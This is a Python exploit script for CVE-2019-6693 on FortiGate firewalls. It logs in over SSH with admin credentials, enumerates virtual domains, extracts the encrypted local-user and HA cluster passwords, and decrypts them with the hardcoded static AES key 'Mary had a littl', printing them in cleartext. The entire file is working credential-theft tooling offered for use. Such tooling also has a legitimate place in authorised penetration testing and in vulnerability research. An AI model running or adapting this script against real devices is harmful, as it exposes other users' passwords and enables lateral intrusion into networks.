#! /usr/bin/env python3
# -*- coding: utf-8 -*- 
r''' 
    	Copyright 2025 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        Great thanks to: https://github.com/saladandonionrings/cve-2019-6693
        
        File name CVE-2019-6693-PassRetriever.py
        written by Tijl Deneut

'''
import argparse, socket, base64, time
try: from Crypto.Cipher import AES
except: exit('[-] Error: PyCryptodome required: python3 -m pip install pycryptodome')
try: import paramiko
except: exit('[-] Error: Paramiko required: python3 -m pip install paramiko')

iTimeout = 2 ## seconds

def getBanner(arrArgs):
    #sIP, iPort, boolVerbose
    sIP = arrArgs[0]; iPort = arrArgs[1]; boolVerbose = arrArgs[2]
    sBanner = ''
    try:
        oSock = socket.create_connection((sIP, iPort), timeout=iTimeout)
        bBanner = oSock.recv(1024)
        oSock.close()
        try: 
            sBanner = bBanner.split(b"\n")[0].decode(errors='ignore')
            print('[+] Connection {}:{} has banner {}'.format(sIP, iPort, sBanner))
        except: 
            print('[-] No banner found')
            pass
    except:
        if boolVerbose: print('[-] Connection {}:{} timed out'.format(sIP, iPort))
    return sBanner

def getPrompt(oShell):
    def flush(oShell):
        while oShell.recv_ready(): oShell.recv(1024)
    flush(oShell)  # flush everything from before
    #oShell.sendall('\n') ## sometimes needed, but not on fortigates

    time.sleep(.3)
    sPrompt = str(oShell.recv(1024), encoding='utf-8').strip()
    flush(oShell)  # flush everything after (just in case)
    return sPrompt

def openConnection(sIP,iPort,sUsername,sPassword, boolVerbose=False):
    oSSH = paramiko.SSHClient()
    oSSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ## Create connection
    try: oSSH.connect(hostname=sIP, port=iPort, username=sUsername, password=sPassword)
    except:
        print(f'[-] Error: Creds for {sIP} are not working (username: {sUsername}, port: {iPort})') 
        exit(0)
    ## Getting the prompt (hostname)
    sPrompt = getPrompt(oSSH.invoke_shell())
    if boolVerbose: print(f'Prompt: {sPrompt}')
    
    ## Verify Full Admin access
    oStdin, oStdout, oStderr = oSSH.exec_command('fnsysctl ls -al /')
    if oStderr.read() != b'': 
        print(f'[-] User {sUsername} does not have the correct privileges on device {sIP}')
        exit(0)
    
    return oSSH, sPrompt

def getVDOMs(oSSH, boolVerbose):
    lstVDOMs = []
    lstCmds=['config global','diagnose sys ha checksum cluster']
    oStdin, oStdout, oStderr = oSSH.exec_command('\n'.join(lstCmds))
    if oStderr.read() == b'': 
        for sLine in oStdout.readlines(): 
            if not ':' in sLine: continue
            if 'all: ' in sLine or 'global: ' in sLine or 'root: ' in sLine or sLine.startswith('WARNING: ') or sLine.startswith('Note: '): continue
            sVDOM = sLine.split(':')[0]
            if not sVDOM in lstVDOMs: lstVDOMs.append(sVDOM)
        print(f'[+] Found {len(lstVDOMs)} VDOM\'s')
        if boolVerbose: 
            for sVDOM in lstVDOMs: print(f'   - {sVDOM}')
        return lstVDOMs
    else: 
        print('[-] Error running command:')
        print(oStderr.read())
        exit(1)
    return

def decryptString(sEncrypted):
    bKey = b'Mary had a littl'
    bData = base64.b64decode(sEncrypted)
    bIV = bData[0:4] + b'\x00' * 12
    bEncr = bData[4:]
    oCipher = AES.new(bKey, AES.MODE_CBC, bIV)
    try: bClear = oCipher.decrypt(bEncr)
    except: return 'Decryption Failed'
    if b'\x00' in bClear: bClear = bClear.split(b'\x00')[0]
    sClearPass = bClear.decode(errors='ignore')
    return sClearPass

def getUsers(oSSH, sVDOM, boolVerbose):
    print(f'[+] Getting users for VDOM {sVDOM} (if any)')
    lstUsers = []
    lstCmds=['config vdom',f'edit {sVDOM}','show user local']
    oStdin, oStdout, oStderr = oSSH.exec_command('\n'.join(lstCmds))
    if oStderr.read() == b'':
        dctUser = {}
        for sLine in oStdout.readlines():
            sLine = sLine.strip().lstrip(' ').rstrip(' ')
            if sLine.startswith('edit "'):
                dctUser['User'] = sLine.split('"')[1]
            elif sLine.startswith('set type'):
                sType = sLine.split(' ')[-1]
                if sType == 'ldap' and dctUser: dctUser['Password'] = '<NoPass-LDAP>'
                elif sType != 'password' and dctUser: dctUser['Password'] = '<NoPass-RemoteUser>'
            elif sLine.startswith('set passwd ENC'):
                sClearPass = decryptString(sLine.split(' ')[-1])
                if dctUser: dctUser['Password'] = sClearPass
            elif sLine.startswith('next'):
                if dctUser: 
                    ## If user has no clear text password only add if Verbose is true
                    if not dctUser['Password'].startswith('<NoPass'): lstUsers.append(dctUser)
                    elif boolVerbose: lstUsers.append(dctUser)
                    dctUser = {}
    else: 
        print('[-] Error running commands:\n{}\n : '.format('\n'.join(lstCmds)))
        print(oStderr.read())
    return lstUsers

def getHA(oSSH):
    print(f'\n[+] Getting HA details (if any)')
    lstCmds=['config global', 'show system ha']
    oStdin, oStdout, oStderr = oSSH.exec_command('\n'.join(lstCmds))
    if oStderr.read() == b'': 
        dctHA = {}
        boolHAconfig = False
        for sLine in oStdout.readlines():
            sLine = sLine.strip().lstrip(' ').rstrip(' ')
            if 'config system ha' in sLine: boolHAconfig = True
            elif boolHAconfig and 'set group-name' in sLine: dctHA['Group Name'] = sLine.split('"')[1]
            elif boolHAconfig and 'set password ENC' in sLine:
                sClearPass = decryptString(sLine.split(' ')[-1])
                dctHA['Password'] = sClearPass
            elif sLine == 'end' and boolHAconfig: break
    else: 
        print('[-] Error running command:')
        print(oStderr.read())
    return dctHA

def getFilelist(oSSH, sPrompt, sPath):
    lstFiles = []
    oStdin, oStdout, oStderr = oSSH.exec_command('fnsysctl ls -al {}'.format(sPath))
    for sLine in oStdout.readlines(): lstFiles.append(sLine.replace(sPrompt,'').replace('\n','').strip())
    return lstFiles

def main():
    boolVerbose = False
    ## Banner
    print(r'''
    [*****************************************************************************]
                   --- Remote credential decoder (CVE-2019-6693) ---
        This script will try to connect to a running FortiGate device via SSH 
                          and decode User & HA credentials.
    ______________________/-> Created By Tijl Deneut(c) <-\_______________________
    [*****************************************************************************]
    ''')
    ## Defaults and parsing arguments
    oParser = argparse.ArgumentParser()
    oParser.add_argument('-t', '--target', help='TARGET mode, provide IP address', default='')
    oParser.add_argument('-p', '--port', help='Target TCP Port, default 22', default=22, type=int)
    oParser.add_argument('-u', '--username', help='Target username', default='')
    oParser.add_argument('-a', '--password', help='Target password', default='')
    oParser.add_argument('-v', '--verbose', help='Verbosity; more info', action='store_true')
    dctArgs = oParser.parse_args()
    boolVerbose = dctArgs.verbose
    if dctArgs.target: getBanner((dctArgs.target,dctArgs.port,boolVerbose))
    else: print('[-] Please provide at least the target (hostname or IP address)')
    if not dctArgs.password or not dctArgs.username:
        print('[-] No password or username provided, stopping here')
        exit(0)
    
    oSSH, sPrompt = openConnection(dctArgs.target, dctArgs.port, dctArgs.username, dctArgs.password)
    
    lstVDOMs = getVDOMs(oSSH, boolVerbose)
    
    for sVDOM in lstVDOMs:
        dctUsers = getUsers(oSSH, sVDOM, boolVerbose)
        for dctUser in dctUsers:
            print('    {} : {}'.format(dctUser['User'], dctUser['Password']))
    
    dctHA = getHA(oSSH)
    if dctHA: print('    GroupName {} : Password {}'.format(dctHA['Group Name'], dctHA['Password']))
    return

if __name__ == "__main__":
	main()
